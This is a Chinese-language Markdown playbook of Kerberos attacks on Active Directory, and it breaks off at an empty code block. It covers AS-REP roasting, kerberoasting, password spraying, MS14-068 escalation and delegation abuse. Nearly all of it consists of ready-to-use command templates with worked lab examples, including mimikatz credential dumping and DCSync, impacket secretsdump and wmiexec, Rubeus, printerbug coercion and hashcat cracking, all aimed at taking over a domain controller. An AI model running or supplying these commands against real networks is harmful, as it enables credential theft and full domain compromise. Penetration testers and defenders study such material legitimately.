# Kerberos攻击面

## 获取域用户

### AS-Reproasting

#### 利用条件

- 存在关闭**预身份认证（Pre-Authentication）**的用户

![asrep](../../images/AD/Kerberos/asrep-1.png)

#### 攻击方式

1. 查找**没有**开启**预身份认证**的用户

  - 方法一：使用**PowerView**查看

  ```shell
  powershell "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-DomainUser -PreauthNotRequired"
  ```

![asrep](../../images/AD/Kerberos/asrep-2.png)

  - 方法二：使用**SharpView**查看

  ```shell
  SharpView.exe Get-DomainUser -PreauthNotRequired
  ```

  ![asrep](../../images/AD/Kerberos/asrep-3.png)

2. 获取**没有开启预身份认证**的用户的**ASREPHash**

  - **未获取**域账号和密码

    - 方法一：使用**ASREPRoast**获取**ASREPHash**（PS：在**asrephash.txt**文件中的**$krb5asrep后拼接$23**字符串）
    
    ```shell
    # 模板
    powershell "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\ASREPRoast.ps1;Get-ASREPHash -UserName <没有开启预身份认证的用户名>|Out-File -Encoding ASCII asrephash.txt"
    # 示例
    powershell "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\ASREPRoast.ps1;Get-ASREPHash -UserName worker02|Out-File -Encoding ASCII asrephash.txt"
    ```
    
    ![asrep](../../images/AD/Kerberos/asrep-4.png)
    
    - 方法二：使用**Rubeus**获取**ASREPHash**（PS：使用proxifier连接到teamserver服务器的socks4a代理）
    
      - 获取**指定用户**的**ASREPHash**
    
      ```shell
      # 模板
      Rubeus.exe asreproast /user:<没有开启预身份认证的用户名> /domain:<域名> /dc:<域控服务器IP> /format:hashcat /outfile:asrephash.txt
      # 示例
      Rubeus.exe asreproast /user:worker02 /domain:chatapt.com /dc:10.10.10.2 /format:hashcat /outfile:asrephash.txt
      ```
    
      ![asrep](../../images/AD/Kerberos/asrep-5.png)
    
      - 获取**所有用户**的**ASREPHash**
    
      ```shell
      Rubeus.exe asreproast /format:hashcat /outfile:asrephash.txt
      ```
    
      ![asrep](../../images/AD/Kerberos/asrep-6.png)

  - **已获取**域账号和密码

    - 使用**impacket**工具包中的**GetNPUsers**获取所有**未开启预身份认证**的用户**ASREPHash**

    ```shell
    # 模板
    proxychains python3 GetNPUsers.py -request <域名/域账号:密码> -format hashcat -outputfile asrephash.txt
    # 示例
    proxychains python3 GetNPUsers.py -request chatapt.com/worker02:1qaz@WSX -format hashcat -outputfile asrephash.txt
    ```
    
    ![asrep](../../images/AD/Kerberos/asrep-7.png)

3. 使用**hashcat**破解**ASREPHash**

   - 使用字典破解

   ```shell
   hashcat.exe -m 18200 asrephash.txt password.dict -O --force
   ```

   ![asrep](../../images/AD/Kerberos/asrep-8.png)

   - 使用未知密码破解

   ```shell
   # 破解8位未知密码
   hashcat.exe -m 18200 -a 3 asrephash.txt ?a?a?a?a?a?a?a?a -O --force
   ```

### kerberoasting

#### 前期准备

- 破解账号选择

|   SPN账号类型    |                             分析                             |
| :--------------: | :----------------------------------------------------------: |
| 用户账号（推荐） | 密码由用户控制，定期修改，可能会使用**弱口令**，并且为了不影响业务，密码长期不修改 |
|     机器账号     |             密码由机器随机生成，并且30天更换一次             |

#### 攻击方式

1. 获取**SPN**账号**HASH**

   - **未获取**域账号和密码

     - 方法一：使用**Invoke-Kerberoast**获取所有**SPN**账户**HASH**

     ```shell
     powershell "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\Invoke-Kerberoast.ps1;Invoke-Kerberoast -OutputFormat Hashcat|Select hash|ConvertTo-CSV -NoTypeInformation > hash.csv"
     ```

     ![kerb](../../images/AD/Kerberos/kerb-1.png)

     - 方法二：使用**Rubeus**获取所有**SPN**账户**HASH**

     ```shell
     Rubeus.exe kerberoast /outfile:hash.txt
     ```

     ![kerb](../../images/AD/Kerberos/kerb-2.png)


   - **已获取**域账号和密码

     - 使用**impacket**工具包中的**GetUserSPNs**获取所有**SPN**账户**HASH**

     ```shell
     # 模板
     proxychains python3 GetUserSPNs.py <域名/域账号:密码> -request -outputfile hash.txt
     # 示例
     proxychains python3 GetUserSPNs.py chatapt.com/worker02:1qaz@WSX -request -outputfile hash.txt
     ```

     ![kerb](../../images/AD/Kerberos/kerb-3.png)

2. 使用**hashcat**破解**SPN账户的HASH**获取明文**密码**

   - 使用字典破解

   ```shell
   hashcat.exe -m 13100 hash.txt password.dict -O --force
   ```

   ![kerb](../../images/AD/Kerberos/kerb-4.png)

   - 使用未知密码破解
   
   ```shell
   # 破解8位未知密码
   hashcat.exe -m 13100 -a 3 hash.txt ?a?a?a?a?a?a?a?a -O --force
   ```


### 用户名枚举和密码爆破

#### 利用条件

- **kerbrute**要求本地存在**ldap服务**

- 进行**kerbrute**的方法

  - 方法一：使用**Proxifier代理**

  - 方法二：把**kerbrute**工具**上传到靶机**（推荐，速度较快）

#### 攻击方式

1. 使用**kerbrute**枚举域存在的**账号**

```shell
# 模板
kerbrute_windows_386.exe userenum -d <目标域名> <username.dict>
# 示例
kerbrute_windows_386.exe userenum -d chatapt.com username.dict
```

![enum](../../images/AD/Kerberos/enum-1.png)

2. 使用**kerbrute**获取**密码**

     - 使用**单个密码**爆破**多个账号**

   ```shell
   # 模板
   kerbrute_windows_386.exe passwordspray -d <目标域名> <username.list> <固定密码>
   # 示例
   kerbrute_windows_386.exe passwordspray -d chatapt.com username.dict 1qaz@WSX
   ```

   ![enum](../../images/AD/Kerberos/enum-2.png)

     - 使用**密码字典**爆破**单个账号**

   ```shell
   # 模板
   kerbrute_windows_386.exe bruteuser -d <目标域名> password.dict <需要爆破的用户名>
   # 示例
   kerbrute_windows_386.exe bruteuser -d chatapt.com password.dict worker01
   ```

   ![enum](../../images/AD/Kerberos/enum-3.png)

## 提升域用户权限

### MS14-068

| PrimaryGroupId | 用户组             |
| -------------- | ------------------ |
| 513            | 域用户             |
| 512            | 域管理员           |
| 518            | 架构管理员         |
| 519            | 企业管理员         |
| 520            | 组策略创建者所有者 |

#### 攻击方式

##### goldenPac

- 使用impacket工具包中的goldenPac获取域控权限

```shell
# 模板
proxychains python3 goldenPac.py <域名>/<域用户>:<密码>@<域控服务器域名> -dc-ip <域控服务器IP> -target-ip <目标域控服务器IP>
# 示例
proxychains python3 goldenPac.py vpxuser.com/worker01:1qaz@WSX@DC-MASTER.vpxuser.com -dc-ip 10.10.10.2 -target-ip 10.10.10.1
```

![ms14068](../../images/AD/Kerberos/ms14068-1.png)

##### kekeo

1. 使用kekeo申请票据

```shell
kekeo.exe "exploit::ms14068 /domain:<域名> /user:<用户名> /password:<密码> /ptt" "exit"
kekeo.exe "exploit::ms14068 /domain:vpxuser.com /user:worker01 /password:1qaz@WSX /ptt" "exit"
```

![ms14068](../../images/AD/Kerberos/ms14068-2.png)

2. 测试是否提权成功

```shell
dir \\DC-MASTER\C$
```

![ms14068](../../images/AD/Kerberos/ms14068-3.png)

##### mimikatz

1. 查看当前用户的SID

```shell
whoami /user
```

![ms14068](../../images/AD/Kerberos/ms14068-4.png)

2. 使用**MS14-068**的EXP对目标域账户进行提权

```shell
# 模板
MS14-068.exe -u <用户名@域名> -p <密码> -s <用户SID> -d <域控服务器域名>
# 示例
MS14-068.exe -u worker01@vpxuser.com -p 1qaz@WSX -s S-1-5-21-1354505229-3609808509-2427717812-1106 -d DC-MASTER.vpxuser.com
```

![ms14068](../../images/AD/Kerberos/ms14068-5.png)

3. 使用**mimikatz**导入票据

```shell
# 模板
mimikatz.exe "kerberos::purge" "kerberos::ptc <TGT_username>@<域名>.ccache" "exit"
# 示例
mimikatz.exe "kerberos::purge" "kerberos::ptc TGT_worker01@vpxuser.com.ccache" "exit"
```

![ms14068](../../images/AD/Kerberos/ms14068-6.png)

4. 测试是否提权成功

```shell
net use \\DC-MASTER\admin$
dir \\DC-MASTER\C$
```

![ms14068](../../images/AD/Kerberos/ms14068-7.png)

### 委派

#### 非约束委派

##### 前期准备 - 查找非约束委派账号

###### 情景一：无域账号密码

- 方法一：使用AdFind查找

  - 查找用户账号

  ```shell
  # 模板
  AdFind.exe -b "DC=<域名>,DC=<域名>" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn
  # 示例
  AdFind.exe -b "DC=chatapt,DC=com" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn
  ```

  ![ud](../../images/AD/Kerberos/ud-1.png)

  - 查找机器账号

  ```shell
  # 模板
  AdFind.exe -b "DC=<域名>,DC=<域名>" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn
  # 示例
  AdFind.exe -b "DC=chatapt,DC=com" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn
  ```

  ![ud](../../images/AD/Kerberos/ud-2.png)

- 方法二：使用PowerView查找

  - 查找机器账号

  ```
  # 模板
  powershell -ep bypass -c "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-NetComputer -Unconstrained -Domain <域名>"
  # 示例
  powershell -ep bypass -c "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-NetComputer -Unconstrained -Domain chatapt.com"
  ```

  ![ud](../../images/AD/Kerberos/ud-3.png)

###### 情景二：有域账号密码

1. 使用**ldapdomaindump**获取域内信息

```shell
# 模板
proxychains ldapdomaindump -u <域名>\\<域账号> -p <密码> <域控服务器IP>
# 示例
proxychains ldapdomaindump -u chatapt.com\\worker01 -p 1qaz@WSX 10.10.10.2
```

![ud](../../images/AD/Kerberos/ud-4.png)

2. 查询非约束委派账号

   - 获取用户账号

   ```shell
   grep TRUSTED_FOR_DELEGATION domain_users.grep
   ```

   ![ud](../../images/AD/Kerberos/ud-5.png)

   - 获取机器账号

   ```shell
   grep TRUSTED_FOR_DELEGATION domain_computers.grep
   ```

   ![ud](../../images/AD/Kerberos/ud-6.png)

##### 攻击方式

###### 方法一：有SPN账号的密码

- 利用条件

  - SPN账号具备读取和写入SPN权限

  ![ud](../../images/AD/Kerberos/ud-7.png)

  - SPN账号权限不足会出现如下报错

  ![ud](../../images/AD/Kerberos/ud-8.png)

- 攻击方法

  1. 使SPN域名解析到被控服务器

     - 添加一个新的SPN域名

     ```shell
     # 模板
     proxychains python3 addspn.py -u <域名>\\<SPN用户> -p <密码> -s HOST/<SPN域名> ldap://<域控IP>
     # 示例
     proxychains python3 addspn.py -u chapt.com\\mssqladmin -p 1qaz@WSX -s HOST/relayx.chatapt.com ldap://10.10.10.2
     ```
     
     ![ud](../../images/AD/Kerberos/ud-9.png)
     
     - 使用**dnstool**添加一条DNS解析记录，把SPN的域名解析到被控终端（PS：由于proxychains无法传输udp协议数据，所以需要上传dnstool到被控端）

     ```shell
     # 模板
     dnstool.exe -u <域名>\<域用户> -p <密码> -r <自定义SPN域名> -a add -d <被控终端IP> <域控IP>
     # 示例
     dnstool.exe -u chatapt.com\worker01 -p 1qaz@WSX -r relayx.chatapt.com -a add -d 10.10.255.1 10.10.10.2
     ```
     
     ![ud](../../images/AD/Kerberos/ud-10.png)
     
  2. 开启**krbrelayx**监听
  
  ```shell
  # 模板
  proxychains python3 krbrelayx.py -p <SPN账号的密码> -s <域名>
  # 示例
  proxychains python3 krbrelayx.py -p 1qaz@WSX -s chatapt.com
  ```
  
  ![ud](../../images/AD/Kerberos/ud-11.png)
  
  3. 触发**强制认证漏洞**，获取**tgt票据**（PS：这里使用打印机漏洞**printerbug**触发）
  
  ```shell
  # 模板
  proxychains python3 printerbug.py <域名>/<SPN用户名>:<密码>@<辅域控IP> <自定义的SPN域名>
  # 示例
  proxychains python3 printerbug.py chatapt.com/mssqladmin:1qaz@WSX@10.10.10.1 relayx.chatapt.com
  ```
  
  ![ud](../../images/AD/Kerberos/ud-12.png)
  
  ![ud](../../images/AD/Kerberos/ud-13.png)
  
  4. 获取**域管理员HASH**
  
       - 把tgt票据导入环境变量
  
     ```shell
     # 模板
     export KRB5CCNAME=<票据>
     # 示例
     export KRB5CCNAME=DC-MASTER\$\@CHATAPT.COM_krbtgt\@CHATAPT.COM.ccache
     ```
  
     ![ud](../../images/AD/Kerberos/ud-14.png)
  
     - 在host添加DNS解析记录
  
     ```ini
     # 模板
     <域控服务器域名>	<域控服务器IP>
     <域名>	<域控服务器IP>
     # 示例
     DC-MASTER.chatapt.com	10.10.10.1
     chatapt.com	10.10.10.1
     ```
  
     ![ud](../../images/AD/Kerberos/ud-15.png)
  
       - 使用**secretsdump**获取域**管理员HASH**
  
     ```shell
     # 模板
     proxychains python3 secretsdump.py -no-pass -k <域控服务器域名> -just-dc-user <域管理员账号> -just-dc-ntlm
     # 示例
     proxychains python3 secretsdump.py -no-pass -k DC-MASTER.chatapt.com -just-dc-user administrator -just-dc-ntlm
     ```
  
     ![ud](../../images/AD/Kerberos/ud-16.png)
  
  5. 使用**exec工具**远程控制域控服务器（PS：这里使用**wmiexec**）
  
  ```shell
  # 模板
  proxychains python3 wmiexec.py -hashes <NTLM HASH> <域名>/<域管理员用户名>@<域控服务器IP> -no-pass
  # 示例
  proxychains python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 chatapt.com/administrator@DC-MASTER.chatapt.com -no-pass
  ```
  
  ![ud](../../images/AD/Kerberos/ud-17.png)

###### 方法二：无SPN账号的密码

- 利用条件：获取Administrator权限

- 攻击方法

  1. 使用**Rubeus**每隔2秒监听一次

  ```shell
  # 模板
  Rubeus.exe monitor /interval:2 /filteruser:<域控服务器名称>
  # 示例
  Rubeus.exe monitor /interval:2 /filteruser:DC-AUXILIARY$
  ```

  ![ud](../../images/AD/Kerberos/ud-18.png)

  - 使用触发强制认证

  ```shell
  # 模板
  SpoolSample.exe <域控服务器名称> <SPN机器账号>
  # 示例
  SpoolSample.exe DC-AUXILIARY MSSQL
  ```

  ![ud](../../images/AD/Kerberos/ud-19.png)

  - 使用mimikatz导出域管理员HASH

  ```shell
  # 模板
  mimikatz.exe "lsadump::dcsync /domain:<域名> /user:<域名>\<域管理员账号>" "exit"
  # 示例
  mimikatz.exe "lsadump::dcsync /domain:chatapt.com /user:CHATAPT\Administrator" "exit"
  ```

  ![ud](../../images/AD/Kerberos/ud-20.png)

#### 约束委派

##### 利用条件

- 获取**SPN服务器**的**Administrator权限**

##### 前期准备  - 查找约束委派账号

###### 情景一：无域账号密码

- 方法一：使用AdFind查找

  - 查找用户账号

  ```shell
  # 模板
  AdFind.exe -b "DC=<域名>,DC=<域名>" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
  # 示例
  AdFind.exe -b "DC=chatapt,DC=com" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
  ```

  ![cd](../../images/AD/Kerberos/cd-1.png)

  - 查找机器账号

  ```shell
  # 模板
  AdFind.exe -b "DC=<域名>,DC=<域名>" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
  # 示例
  AdFind.exe -b "DC=chatapt,DC=com" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
  ```

  ![cd](../../images/AD/Kerberos/cd-2.png)

- 方法二：使用PowerView查找

  - 查找用户账号

  ```shell
  # 模板
  powershell -ep bypass -c "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-DomainUser –TrustedToAuth -domain <域名> -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl"
  # 示例
  powershell -ep bypass -c "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-DomainUser –TrustedToAuth -domain chatapt.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl"
  ```

  ![cd](../../images/AD/Kerberos/cd-3.png)

  - 查找机器账号

  ```shell
  # 模板
  powershell -ep bypass -c "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-DomainComputer -TrustedToAuth -domain <域名> -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize"
  # 示例
  powershell -ep bypass -c "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-DomainComputer -TrustedToAuth -domain chatapt.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize"
  ```

  ![cd](../../images/AD/Kerberos/cd-4.png)

###### 情景二：有域账号密码

1. 使用**ldapdomaindump**获取域内信息

```shell
# 模板
proxychains ldapdomaindump -u <域名>\\<域账号> -p <密码> <域控服务器IP>
# 示例
proxychains ldapdomaindump -u chatapt.com\\worker01 -p 1qaz@WSX 10.10.10.2
```

![cd](../../images/AD/Kerberos/cd-13.png)

2. 查询约束委派账号

   - 获取服务账号

   ```shell
   grep TRUSTED_TO_AUTH_FOR_DELEGATION domain_users.grep
   ```

   ![cd](../../images/AD/Kerberos/cd-14.png)

     - 获取机器账号

   ```shell
   grep TRUSTED_TO_AUTH_FOR_DELEGATION domain_computers.grep
   ```

   ![cd](../../images/AD/Kerberos/cd-15.png)

##### 攻击方式

###### 方法一：使用机器账号的HASH

1. 获取**SPN机器账号**的**HASH**

```shell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

![cd](../../images/AD/Kerberos/cd-5.png)

2. 使用SPN机器账号的HASH申请**票据缓存**

```shell
# 模板
proxychains python3 getST.py -dc-ip <域控服务器IP> -spn <约束委派的服务> -impersonate administrator <域名>/<机器账号> -hashes :<机器账号HASH>
# 示例
proxychains python3 getST.py -dc-ip 10.10.10.2 -spn CIFS/DC-AUXILIARY.chatapt.com -impersonate administrator chatapt.com/HTTP$ -hashes :fc34d1f637aa72692bbbfc114311c8b8
```

![cd](../../images/AD/Kerberos/cd-6.png)

3. 把**票据缓存**导入环境变量

```shell
# 模板
export KRB5CCNAME=<票据缓存ccache>
# 示例
export KRB5CCNAME=administrator.ccache
```

![cd](../../images/AD/Kerberos/cd-7.png)

4. 使用**exec工具**远程连接域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -k <域名>/<域管理员账号>@<域控服务器域名> -no-pass -dc-ip <域控服务器IP>
# 示例
proxychains python3 wmiexec.py -k chatapt.com/administrator@DC-AUXILIARY.chatapt.com -no-pass -dc-ip 10.10.10.1
```

![cd](../../images/AD/Kerberos/cd-8.png)

###### 方法二：使用机器账号的票据（只能获取访问某个服务的权限）

1. 使用**mimikatz**导出**TGT票据**

```shell
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
```

![cd](../../images/AD/Kerberos/cd-9.png)

2. 使用**kekeo**请求**TGS**票据

```shell
# 模板
kekeo.exe "tgs::s4u /tgt:<TGT票据> /user:<高权限用户账号>@<域名> /service:<非约束委派服务>" "exit"
# 示例
kekeo.exe "tgs::s4u /tgt:[0;3e7]-2-1-40e10000-HTTP$@krbtgt-CHATAPT.COM.kirbi /user:Administrator@chatapt.com /service:cifs/DC-AUXILIARY.chatapt.com" "exit"
```

![cd](../../images/AD/Kerberos/cd-10.png)

3. 使用**mimikatz**把**TGS**票据注入到当前会话

```shell
# 模板
mimikatz.exe "kerberos::ptt <TGS票据>" "exit"
# 示例
mimikatz.exe "kerberos::ptt TGS_Administrator@chatapt.com@CHATAPT.COM_cifs~DC-AUXILIARY.chatapt.com@CHATAPT.COM.kirbi" "exit"
```

![cd](../../images/AD/Kerberos/cd-11.png)

4. 访问域控的**CIFS服务**

```shell
# 模板
dir \\<域控服务器域名>\C$
# 示例
dir \\DC-AUXILIARY.chatapt.com\C$
```

![cd](../../images/AD/Kerberos/cd-12.png)

#### 基于资源的约束委派

##### 前期准备 - 查找基于资源的约束委派账号

###### 反向查找 - 查询将机器加入域的用户

- 利用条件：需要获取一个域用户的密码

- 使用**AdFind**查找具有**mS-DS-CreatorSID**属性的账号

```shell
# 模板
AdFind.exe -h <域控服务器IP> -u <域账号> -up <密码> -b "DC=<域名>,DC=<域名>" -f "objectClass=computer" mS-DS-CreatorSID
# 示例
AdFind.exe -h 10.10.10.2 -u worker01 -up 1qaz@WSX -b "DC=chatapt,DC=com" -f "objectClass=computer" mS-DS-CreatorSID
```

![rbcd](../../images/AD/Kerberos/rbcd-1.png)

- 使用**powershell**查询SID对应的用户名

```shell
# 模板
powerpick $objSID = New-Object System.Security.Principal.SecurityIdentifier <SID>;$objUser = $objSID.Translate([System.Security.Principal.NTAccount]);$objUser.Value
# 示例
powerpick $objSID = New-Object System.Security.Principal.SecurityIdentifier S-1-5-21-2031906553-2665046962-2085994062-1611;$objUser = $objSID.Translate([System.Security.Principal.NTAccount]);$objUser.Value
```

![rbcd](../../images/AD/Kerberos/rbcd-2.png)

###### 正向查找 - 查询当前用户把哪些机器加入域

- 查看当前用户的SID

```shell
whoami /all
```

![rbcd](../../images/AD/Kerberos/rbcd-3.png)

- 使用powershell查找当前用户对哪些机器具备GeneriCall或WriteProperty等修改权限

```shell
# 模板
powershell -ep bypass -c "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-DomainObjectAcl | ?{$_.SecurityIdentifier -match '<SID>'} | select objectdn,activedirectoryrights"
# 示例
powershell -ep bypass -c "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-DomainObjectAcl | ?{$_.SecurityIdentifier -match 'S-1-5-21-2031906553-2665046962-2085994062-1611'} | select objectdn,activedirectoryrights"
```

![rbcd](../../images/AD/Kerberos/rbcd-4.png)

##### 攻击方式

###### 方法一：通过管理主机加入域的用户拿下主机

- 使用**addcomputer**创建**机器账号**

```shell
# 模板
proxychains python3 addcomputer.py <域名>/<具备创建机器账号的域用户>:<密码> -method SAMR -computer-name <要创建的机器账号名称> -computer-pass <要创建的机器账号的密码> -dc-ip <主域控服务器IP>
# 示例
proxychains python3 addcomputer.py chatapt.com/addpcadmin:1qaz@WSX -method SAMR -computer-name HACK\$ -computer-pass P@ssw0rd -dc-ip 10.10.10.1
```

![rbcd](../../images/AD/Kerberos/rbcd-5.png)

- 查询刚才创建机器账号的**SID**

```shell
# 模板
powershell -ep bypass -c "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-NetComputer <刚才创建的机器账号> -Properties objectsid"
# 示例
powershell -ep bypass -c "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-NetComputer HACK -Properties objectsid"
```

![rbcd](../../images/AD/Kerberos/rbcd-6.png)

- 修改服务资源的委派属性

```shell
# 模板
powershell -ep bypass -c "$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList 'O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<刚才创建机器账号的SID>)';$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-DomainComputer <要提权的机器账号> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose"
# 示例
powershell -ep bypass -c "$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList 'O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2031906553-2665046962-2085994062-1109)';$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-DomainComputer MSSQL | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose"
```

![rbcd](../../images/AD/Kerberos/rbcd-7.png)

- 查看属性是否修改成功

```shell
# 模板
powershell -ep bypass -c "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-DomainComputer <要提权的机器账号> -Properties msds-allowedtoactonbehalfofotheridentity"
# 示例
powershell -ep bypass -c "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-DomainComputer MSSQL -Properties msds-allowedtoactonbehalfofotheridentity"
```

![rbcd](../../images/AD/Kerberos/rbcd-8.png)

- 使用**getST**申请票据

```shell
# 模板
proxychains python3 getST.py <域名>/<刚才创建的机器账号>:<密码> -spn <目标服务器的SPN服务> -impersonate administrator -dc-ip 10.10.10.2
# 示例
proxychains python3 getST.py chatapt.com/HACK$:P@ssw0rd -spn cifs/MSSQL.chatapt.com -impersonate administrator -dc-ip 10.10.10.2
```

![rbcd](../../images/AD/Kerberos/rbcd-9.png)

- 把票据导入环境变量

```shell
# 模板
export KRB5CCNAME=<票据名称>
# 示例
export KRB5CCNAME=administrator.ccache
```

![rbcd](../../images/AD/Kerberos/rbcd-10.png)

- 使用**exec工具**远程登录目标服务器，获取目标服务器的**administrator权限**

```shell
# 模板
proxychains python3 wmiexec.py -k <域名>/administrator@<目标机器域名> -no-pass
# 示例
proxychains python3 wmiexec.py -k chatapt.com/administrator@MSSQL.chatapt.com -no-pass
```

![rbcd](../../images/AD/Kerberos/rbcd-11.png)

###### 方法二：通过Account Operators组用户拿下主机

- 利用条件：目标用户属于**Account Operators用户组**

- 攻击方法

  - 使用**AdFind**查找属于**Account Operators用户组**的账号

  ```shell
  # 模板
  adfind.exe -h <域控服务器IP>:389 -s subtree -b CN="Account Operators",CN=Builtin,DC=<域名>,DC=<域名> member
  # 示例
  adfind.exe -h 10.10.10.1:389 -s subtree -b CN="Account Operators",CN=Builtin,DC=chatapt,DC=com member
  ```

  ![rbcd](../../images/AD/Kerberos/rbcd-12.png)

  - 使用**addcomputer**创建**机器账号**

  ```shell
  # 模板
  proxychains python3 addcomputer.py <域名>/<具备创建机器账号的域用户>:<密码> -method SAMR -computer-name <要创建的机器账号名称> -computer-pass <要创建的机器账号的密码> -dc-ip <主域控服务器IP>
  # 示例
  proxychains python3 addcomputer.py chatapt.com/super:1qaz@WSX -method SAMR -computer-name READTEAM\$ -computer-pass P@ssw0rd -dc-ip 10.10.10.1
  ```

  ![rbcd](../../images/AD/Kerberos/rbcd-13.png)

  - 查询刚才创建机器账号的**SID**

    - 使用**PowerView**查找

    ```shell
    # 模板
    powershell -ep bypass -c "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-NetComputer <刚才创建的机器账号> -Properties objectsid"
    # 示例
    powershell -ep bypass -c "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-NetComputer READTEAM -Properties objectsid"
    ```

    ![rbcd](../../images/AD/Kerberos/rbcd-14.png)

    - 使用**ldapdomaindump**查找

    ```shell
    # 模板
    proxychains ldapdomaindump -u <域名>\\<域账号> -p <密码> <域控服务器IP>
    grep <刚才创建的机器账号> domain_computers.grep
    # 示例
    proxychains ldapdomaindump -u chatapt.com\\worker01 -p 1qaz@WSX 10.10.10.2
    grep READTEAM domain_computers.grep
    ```

    ![rbcd](../../images/AD/Kerberos/rbcd-15.png)

  - 修改服务资源的委派属性

  ```shell
  # 模板
  powershell -ep bypass -c "$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList 'O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<刚才创建机器账号的SID>)';$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-DomainComputer <要提权的机器账号> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose"
  # 示例
  powershell -ep bypass -c "$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList 'O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2031906553-2665046962-2085994062-1112)';$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-DomainComputer MSSQL | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose"
  ```

  ![rbcd](../../images/AD/Kerberos/rbcd-16.png)

  - 查看属性是否修改成功

  ```shell
  # 模板
  powershell -ep bypass -c "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-DomainComputer <要提权的机器账号> -Properties msds-allowedtoactonbehalfofotheridentity"
  # 示例
  powershell -ep bypass -c "Set-ExecutionPolicy Bypass -Scope process -Force;Import-Module .\PowerView.ps1;Get-DomainComputer MSSQL -Properties msds-allowedtoactonbehalfofotheridentity"
  ```

  ![rbcd](../../images/AD/Kerberos/rbcd-17.png)

  - 使用**getST**申请票据

  ```shell
  # 模板
  proxychains python3 getST.py <域名>/<刚才创建的机器账号>:<密码> -spn <目标服务器的SPN服务> -impersonate administrator -dc-ip 10.10.10.2
  # 示例
  proxychains python3 getST.py chatapt.com/READTEAM$:P@ssw0rd -spn cifs/MSSQL.chatapt.com -impersonate administrator -dc-ip 10.10.10.2
  ```

  ![rbcd](../../images/AD/Kerberos/rbcd-18.png)

  - 远程连接受控服务器

  ```shell
  # 模板
  KRB5CCNAME=<票据名称> proxychains python3 wmiexec.py -k <域名>/administrator@<目标机器域名> -no-pass
  # 示例
  KRB5CCNAME=administrator.ccache proxychains python3 wmiexec.py -k chatapt.com/administrator@MSSQL.chatapt.com -no-pass
  ```

  ![rbcd](../../images/AD/Kerberos/rbcd-19.png)

###### 方法三：通过 NTLM Relay 和 CVE-2019-1040 拿下主机

- 使用**addcomputer**创建**机器账号**

```shell
# 模板
